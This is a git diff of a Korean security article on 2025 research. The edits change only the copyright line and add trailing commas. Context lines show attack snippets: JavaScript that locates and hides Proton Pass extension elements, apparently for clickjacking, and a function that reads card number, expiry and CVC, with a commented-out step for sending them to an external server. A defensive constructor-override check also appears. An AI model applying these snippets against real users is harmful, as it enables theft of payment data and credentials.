@@ -10,7 +10,7 @@ tags:
 language: kr
 thumbnail: "/images/thumbnail/deep_research_2025_security.png"
 copyright: |
-  © 2025 REWRITE LAB (References) Author: Rewrite Lab (One, TCP/IP, filime)
+  © 2026 HSPACE (References) Author: Rewrite Lab (One, TCP/IP, filime)
   This copyright applies to this document only.
 ---
 
@@ -253,7 +253,7 @@ document.querySelector("child-element").style.opacity = 0;
 
 ```jsx
 const x = Array.from(document.querySelectorAll("*")).find((el) =>
-  el.tagName.toLowerCase().startsWith("protonpass-root-")
+  el.tagName.toLowerCase().startsWith("protonpass-root-"),
 );
 // protonpass-root-로 시작하는 모든 HTML 요소를 긁어와서
 
@@ -311,7 +311,7 @@ function getCardValues() {
   if (expiry && cvc) {
     // DATA WILL BE IN CONSOLE
     console.log(
-      "cardnumber=" + cardnumber + "&expiry=" + expiry + "&cvc=" + cvc
+      "cardnumber=" + cardnumber + "&expiry=" + expiry + "&cvc=" + cvc,
     );
 
     /* Sending data to external server
@@ -804,7 +804,7 @@ if (parameterValue.match(constructorValidation)) {
         "Constructor override attempt is not allowed due to security concerns",
       runIndex,
       itemIndex,
-    }
+    },
   );
 }
 ```
